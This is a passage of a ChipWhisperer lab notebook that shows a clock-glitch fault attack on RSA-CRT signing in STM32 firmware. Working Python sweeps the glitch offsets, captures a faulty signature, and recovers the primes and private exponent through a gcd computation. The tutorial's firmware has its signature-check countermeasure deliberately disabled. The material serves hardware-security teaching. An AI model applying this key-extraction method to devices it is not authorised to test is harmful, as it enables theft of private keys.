    .././crypto/mbedtls//include/mbedtls/sha256.h:127:6: note: expected 'const unsigned char \*' but argument is of type 'const char \*'
     void mbedtls_sha256( const unsigned char \*input, size_t ilen,
          ^~~~~~~~~~~~~~
    simpleserial-rsa-arm.c: In function 'get_pt':
    simpleserial-rsa-arm.c:370:1: warning: control reaches end of non-void function [-Wreturn-type]
     }
     ^



Attack Script
-------------

Start by initializing the ChipWhisperer:


**In [4]:**

.. code:: ipython3

    %run "Helper_Scripts/Setup_Generic.ipynb"


**In [5]:**

.. code:: ipython3

    if SCOPETYPE == "OPENADC":
        scope.clock.adc_src = "clkgen_x1"

Next, program it with our new firmware:


**In [6]:**

.. code:: ipython3

    import time
    fw_path = "../hardware/victims/firmware/simpleserial-rsa/simpleserial-rsa-{}.hex".format(PLATFORM)
    cw.program_target(scope, prog, fw_path)
    time.sleep(1)


**Out [6]:**



.. parsed-literal::

    Detected known STMF32: STM32F302xB(C)/303xB(C)
    Extended erase (0x44), this can take ten seconds or more
    Attempting to program 21063 bytes at 0x8000000
    STM32F Programming flash...
    STM32F Reading flash...
    Verified flash OK, 21063 bytes
    


Verifying Signatures
~~~~~~~~~~~~~~~~~~~~

Let's start by seeing if we can verify the signature that we get back.
First, we run the signature calculation (there's a ``time.sleep()`` here
to make sure the calculation finishes. You may need to increase this):


**In [7]:**

.. code:: ipython3

    import time
    target.flush()
    scope.arm()
    target.write("t\n")
        
    ret = scope.capture()
    if ret:
        print('Timeout happened during acquisition')
        
    time.sleep(2)
    output = target.read(timeout=10)


**In [8]:**

.. code:: ipython3

    if SCOPETYPE == "OPENADC":
        print(scope.adc.trig_count)


**Out [8]:**



.. parsed-literal::

    12693569
    


As you can see, the signature takes a long time! For the STM32F3, it
should be around 12.7M cycles. Next, let's get the rest of the signature
back and see what it looks like.


**In [9]:**

.. code:: ipython3

    target.write("1\n")
    time.sleep(0.2)
    output += target.read(timeout=10)
    
    target.write("2\n")
    time.sleep(0.2)
    output += target.read(timeout=10)


**In [10]:**

.. code:: ipython3

    print(output)


**Out [10]:**



.. parsed-literal::

    r4F09799F6A59081B725599753330B7A2440ABC42606601622FE0C582646E32555303E1062A2989D9B4C265431ADB58DD
    z00
    r85BB33C4BB237A311BC40C1279528FD6BB36F94F534A4D8284A18AB8E5670E734C55A6CCAB5FB5EAE02BA37E2D56648D
    z00
    r7A13BBF17A0E07D607C07CBB72C7A7A77076376E8434CE6E136832DC95DB3D80
    z00
    
    


You should see something like:

::

    r4F09799F6A59081B725599753330B7A2440ABC42606601622FE0C582646E32555303E1062A2989D9B4C265431ADB58DD
    z00
    r85BB33C4BB237A311BC40C1279528FD6BB36F94F534A4D8284A18AB8E5670E734C55A6CCAB5FB5EAE02BA37E2D56648D
    z00
    r7A13BBF17A0E07D607C07CBB72C7A7A77076376E8434CE6E136832DC95DB3D80
    z00

We'll need to strip all the extra simpleserial stuff out. This can be
done like so:


**In [11]:**

.. code:: ipython3

    newout = output.replace("r", "").replace("\nz00","").replace("\n","")
    print(newout)


**Out [11]:**



.. parsed-literal::

    4F09799F6A59081B725599753330B7A2440ABC42606601622FE0C582646E32555303E1062A2989D9B4C265431ADB58DD85BB33C4BB237A311BC40C1279528FD6BB36F94F534A4D8284A18AB8E5670E734C55A6CCAB5FB5EAE02BA37E2D56648D7A13BBF17A0E07D607C07CBB72C7A7A77076376E8434CE6E136832DC95DB3D80
    


Then we can convert this to binary using binascii:


**In [12]:**

.. code:: ipython3

    from binascii import unhexlify, hexlify
    sig = unhexlify(newout)

Finally, we can verify that the signature is correct using the
PyCryptodome package:


**In [13]:**

.. code:: ipython3

    from Crypto.PublicKey import RSA
    from Crypto.Signature import PKCS1_v1_5 
    
    from Crypto.Hash import SHA256
    
    E = 0x10001
    N = 0x9292758453063D803DD603D5E777D7888ED1D5BF35786190FA2F23EBC0848AEADDA92CA6C3D80B32C4D109BE0F36D6AE7130B9CED7ACDF54CFC7555AC14EEBAB93A89813FBF3C4F8066D2D800F7C38A81AE31942917403FF4946B0A83D3D3E05EE57C6F5F5606FB5D4BC6CD34EE0801A5E94BB77B07507233A0BC7BAC8F90F79
    m = b"Hello World!"
    
    hash_object = SHA256.new(data=m)
    pub_key = RSA.construct((N, E))
    signer = PKCS1_v1_5.new(pub_key) 
    sig_check = signer.verify(hash_object, sig)
    print(sig_check)
    
    assert sig_check, "Failed to verify signature on device. Got: {}".format(newout)


**Out [13]:**



.. parsed-literal::

    True
    


If everything worked out correctly, you should see ``True`` printed
above. Now onto the actual attack.

Getting a Glitch
~~~~~~~~~~~~~~~~

As usual, we'll start off by setting up the glitch module:


**In [14]:**

.. code:: ipython3

    scope.glitch.clk_src = "clkgen"
    scope.glitch.output = "clock_xor"
    scope.glitch.trigger_src = "ext_single"
    scope.glitch.repeat = 1
    scope.glitch.width = -9
    scope.glitch.offset = -38.3
    scope.io.hs2 = "glitch"
    print(scope.glitch)
    from collections import namedtuple
    Range = namedtuple('Range', ['min', 'max', 'step'])


**Out [14]:**



.. parsed-literal::

    clk_src     = clkgen
    width       = -8.984375
    width_fine  = 0
    offset      = -38.28125
    offset_fine = 0
    trigger_src = ext_single
    arm_timing  = after_scope
    ext_offset  = 0
    repeat      = 1
    output      = clock_xor
    
    


Now for our actual attack loop. There's a lot going on here, so we'll
move through a little slower than usual. Overall, what we want to do is:
\* Insert a glitch \* Read the signature back \* Verify that it's
correct

The first step is the same as earlier. For the last two, we'll cheat a
little by checking the for the beginning of the correct signature before
proceeding, but we could also read back the whole thing:

.. code:: python

    # Read back signature
    output = target.read(timeout=10)
        if "4F09799" not in output:
            #Something abnormal has happened

Now that we've found some abnormal behaviour, we need to verify that the
target hasn't crashed. This can be done pretty easily by checking if we
got anything at all:

.. code:: python

    if "4F09799" not in output:
        #Something abnormal has happened
        if len(output) > 0:
            # Possible glitch!
        else:
            # Crash, reset and try again
            print(f"Probably crash at {scope.glitch.ext_offset}")
            reset_target(scope)
            time.sleep(0.5)

As a last step, we'll build our full signature and do one final check to
make sure everything looks okay:

.. code:: python

    if len(output) > 0:
        # Possible glitch!
        print(f"Possible glitch at offset {scope.glitch.ext_offset}\nOutput: {output}")
        
        # get rest of signature back
        target.go_cmd = '1\\n'
        target.go()
        time.sleep(0.2)
        output += target.read(timeout=10)

        target.go_cmd = '2\\n'
        target.go()
        time.sleep(0.2)
        output += target.read(timeout=10)
        
        # strip out extra simpleserial stuff
        newout = output.replace("r", "").replace("\nz00","").replace("\n","")
        
        print(f"Full output: {newout}")
        if (len(newout) == 256) and "r0001F" not in output:
            print("Very likely glitch!")
            break

We'll add in scanning over different over different offsets as well.
We'll start at an offset of 7M cycles. We actually have a lot of area
that we could place the glitch in, so the starting point is fairly
arbitrary. For the STM32F3, this places the glitch near the beginning of
the calculation for :math:`s_2`. If you'd like, you can move
``trigger_low()`` into ``simpleserial_mbedtls_rsa_private()`` to see how
long different parts of the algorithm take.

All together, our attack loops looks like this:


**In [15]:**

.. code:: ipython3

    from tqdm import tnrange
    import time
    for i in tnrange(7000000, 7100000):
        scope.glitch.ext_offset = i
        scope.adc.timeout = 3
        target.flush()
        scope.arm()
        target.write("t\n")
        
        ret = scope.capture()
        if ret:
            print('Timeout happened during acquisition')
        time.sleep(2)
        
        # Read back signature
        output = target.read(timeout=10)
        if "4F09799" not in output:
            # Something abnormal happened
            if len(output) > 0:
                # Possible glitch!
                print("Possible glitch at offset {}\nOutput: {}".format(scope.glitch.ext_offset, output))
                
                # Get rest of signature back
                target.write("1\n")
                time.sleep(0.2)
                output += target.read(timeout=10)
                
                target.write("2\n")
                time.sleep(0.2)
                output += target.read(timeout=10)
                
                # Strip out extra simpleserial stuff
                newout = output.replace("r", "").replace("\nz00","").replace("\n","")
                print("Full output: {}".format(newout))
                if (len(newout) == 256) and "r0001F" not in output:
                    print("Very likely glitch!")
                    break
            else:
                # Crash, reset and try again
                print("Probably crashed at {}".format(scope.glitch.ext_offset))
                reset_target(scope)
                time.sleep(0.5)


**Out [15]:**





.. parsed-literal::

    Probably crashed at 7000012
    Probably crashed at 7000014
    Probably crashed at 7000017
    Probably crashed at 7000028
    Possible glitch at offset 7000042
    Output: r1187B790564D43D48CD140A7FF890EEA713D1603D8CBC57CF070EE951479C75E93FE98AD04F535109D957F9AB9AA25DB
    z00
    
    Full output: 1187B790564D43D48CD140A7FF890EEA713D1603D8CBC57CF070EE951479C75E93FE98AD04F535109D957F9AB9AA25DB2FB1A5521C68C986A270782B7A579A12B9AE79DF2F59ED9E6694C64C40AAD9FE46B203DB75792016EEA315F7CAA8F9AAC0FD89052FFAC29C022E32B541B150419E2B6604DDA6BF2582F62C9F7876393D
    Very likely glitch!
    


Now, let's convert our glitched signature to binary and move on to the
final part of the tutorial


**In [16]:**

.. code:: ipython3

    sig = unhexlify(newout)
    print(sig)


**Out [16]:**



.. parsed-literal::

    b'\x11\x87\xb7\x90VMC\xd4\x8c\xd1@\xa7\xff\x89\x0e\xeaq=\x16\x03\xd8\xcb\xc5|\xf0p\xee\x95\x14y\xc7^\x93\xfe\x98\xad\x04\xf55\x10\x9d\x95\x7f\x9a\xb9\xaa%\xdb/\xb1\xa5R\x1ch\xc9\x86\xa2px+zW\x9a\x12\xb9\xaey\xdf/Y\xed\x9ef\x94\xc6L@\xaa\xd9\xfeF\xb2\x03\xdbuy \x16\xee\xa3\x15\xf7\xca\xa8\xf9\xaa\xc0\xfd\x89\x05/\xfa\xc2\x9c\x02.2\xb5A\xb1PA\x9e+f\x04\xdd\xa6\xbf%\x82\xf6,\x9fxv9='
    


Completing The Attack
~~~~~~~~~~~~~~~~~~~~~

We've got our glitched signature, but we've still got a little work to
do. As was mentioned earlier, the message that's signed isn't the
original message, it's a PKCS#1 v1.5 padded hash of it. Luckily, this
standard's fairly simple. PKCS#1 v1.5 padding looks like:

\|00\|01\|ff...\|00\|hash\_prefix\|message\_hash\|

Here, the ff... part is a string of ff bytes long enough to make the
size of the padded message the same as N, while hash\_prefix is an
identifier number for the hash algorithm used on message\_hash. In our
case, SHA256 has the hash prefix
``3031300d060960864801650304020105000420``.

Altogether, the function to build this message looks like:


**In [17]:**

.. code:: ipython3

    def build_message(m, N):
        sha_id = "3031300d060960864801650304020105000420"
        N_len = (len(bin(N)) - 2 + 7) // 8
        pad_len = (len(hex(N)) - 2) // 2 - 3 - len(m)//2 - len(sha_id)//2
        padded_m = "0001" + "ff" * pad_len + "00" + sha_id + m
        return padded_m
    

Now that we've got our function, we can build our message:


**In [18]:**

.. code:: ipython3

    from Crypto.Hash import SHA256
    from binascii import hexlify
    
    hash_object = SHA256.new(data=b"Hello World!")
    hashed_m = hexlify(hash_object.digest()).decode()
    padded_m = build_message(hashed_m, N)
    print(hashed_m)
    print(padded_m)


**Out [18]:**



.. parsed-literal::

    7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069
    0001ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff003031300d0609608648016503040201050004207f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069
    


Now all that's left is to use our gcd formula from earlier:

.. math:: p = gcd(s'^e - m, N)

And we should get either p or q! These calculations can take a while
(the Python version takes a few minutes), so the next block will try to
use gmpy2 (a high precision library that runs much quicker than base
Python). If you don't have gmpy2 installed, it will fall back to Python.


**In [19]:**

.. code:: ipython3

    from math import gcd
    N = 0x9292758453063D803DD603D5E777D7888ED1D5BF35786190FA2F23EBC0848AEADDA92CA6C3D80B32C4D109BE0F36D6AE7130B9CED7ACDF54CFC7555AC14EEBAB93A89813FBF3C4F8066D2D800F7C38A81AE31942917403FF4946B0A83D3D3E05EE57C6F5F5606FB5D4BC6CD34EE0801A5E94BB77B07507233A0BC7BAC8F90F79
    e = 0x10001
    try:
        import gmpy2
        from gmpy2 import mpz
        sig_int = mpz(int.from_bytes(sig, "big"))
        m_int = mpz(int.from_bytes(unhexlify(padded_m), "big"))
        p_test = gmpy2.gcd(sig_int**e - m_int, N)
    except (ImportError, ModuleNotFoundError) as error:
        print("gmpy2 not found, falling back to Python")
        sig_int = int.from_bytes(sig, "big")
        padded_m_int = int.from_bytes(unhexlify(padded_m), "big")
        a = int.from_bytes(sig, "big")**e - int.from_bytes(unhexlify(padded_m), "big")
        p_test = gcd(a, N)
        
    print(hex(p_test))


**Out [19]:**



.. parsed-literal::

    0xc36d0eb7fcd285223cfb5aaba5bda3d82c01cad19ea484a87ea4377637e75500fcb2005c5c7dd6ec4ac023cda285d796c3d9e75e1efc42488bb4f1d13ac30a57
    


Open up ``simpleserial-arm-rsa.c`` and see if the value printed out is
either p or q!

Getting the Rest of the Private Values
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

As mentioned earler, now that we have either p or q, we can derive the
rest of the private values. The easiest is the other prime factor, which
is just:


**In [20]:**

.. code:: ipython3

    q_test = N//p_test
    print(hex(q_test))


**Out [20]:**



.. parsed-literal::

    0xc000df51a7c77ae8d7c7370c1ff55b69e211c2b9e5db1ed0bf61d0d9899620f4910e4168387e3c30aa1e00c339a795088452dd96a9a5ea5d9dca68da636032af
    


Finally, there's d, which can be derived by:


**In [21]:**

.. code:: ipython3

    phi = (q_test - 1)*(p_test - 1)
    def egcd(a, b):
        x,y, u,v = 0,1, 1,0
        while a != 0:
            q, r = b//a, b%a
            m, n = x-u*q, y-v*q
            b,a, x,y, u,v = a,r, u,v, m,n
            gcd = b
        return gcd, x, y
    
    gcd, d, b = egcd(e, phi)
    
    print(hex(d))


**Out [21]:**



.. parsed-literal::

    0x24bf6185468786fdd303083d25e64efc66ca472bc44d253102f8b4a9d3bfa75091386c0077937fe33fa3252d28855837ae1b484a8a9a45f7ee8c0c634f99e8cddf79c5ce07ee72c7f123142198164234cabb724cf78b8173b9f880fc86322407af1fedfdde2beb674ca15f3e81a1521e071513a1e85b5dfa031f21ecae91a34d
    


Going Further
-------------

There's still more you can do with this attack:

-  You can try glitching the other part of the signature calculation to
   verify that you get the other prime factor of N out
-  We used clock glitching in this tutorial. You may want to try it with
   voltage glitching as well

As mentioned earlier in the tutorial, a verification of the calculated
signature was removed:

.. code:: c

        /* Compare in constant time just in case */
        /* for( diff = 0, i = 0; i < ctx->len; i++ ) */
        /*     diff |= verif[i] ^ sig[i]; */
        /* diff_no_optimize = diff; */

        /* if( diff_no_optimize != 0 ) */
        /* { */
        /*     ret = MBEDTLS_ERR_RSA_PRIVATE_FAILED; */
        /*     goto cleanup; */
        /* } */

This part is near the end of
``simpleserial_mbedtls_rsa_rsassa_pkcs1_v15_sign()``. If you want a
larger challenge, you can try uncommenting that and trying to glitch
past it as well.

Tests
-----


**In [22]:**

.. code:: ipython3

    real_p = "0xC36D0EB7FCD285223CFB5AABA5BDA3D82C01CAD19EA484A87EA4377637E75500FCB2005C5C7DD6EC4AC023CDA285D796C3D9E75E1EFC42488BB4F1D13AC30A57".lower()
    real_q = "0xC000DF51A7C77AE8D7C7370C1FF55B69E211C2B9E5DB1ED0BF61D0D9899620F4910E4168387E3C30AA1E00C339A795088452DD96A9A5EA5D9DCA68DA636032AF".lower()
    assert (hex(p_test) == real_p) or (hex(p_test) == real_q), f"Failed to break p or q. Got {hex(p_test)}, excepted {real_p} or {real_q}"


**In [23]:**

.. code:: ipython3

    assert (hex(q_test) == real_p) or (hex(q_test) == real_q), f"Failed to break p or q. Got {hex(p_test)}, excepted {real_p} or {real_q}"


**In [24]:**

.. code:: ipython3

    real_d = "0x24bf6185468786fdd303083d25e64efc66ca472bc44d253102f8b4a9d3bfa75091386c0077937fe33fa3252d28855837ae1b484a8a9a45f7ee8c0c634f99e8cddf79c5ce07ee72c7f123142198164234cabb724cf78b8173b9f880fc86322407af1fedfdde2beb674ca15f3e81a1521e071513a1e85b5dfa031f21ecae91a34d"
    assert (hex(d) == real_d), f"Failed to break private key d. Got {hex(d)}, expected {real_d}"


**In [ ]:**

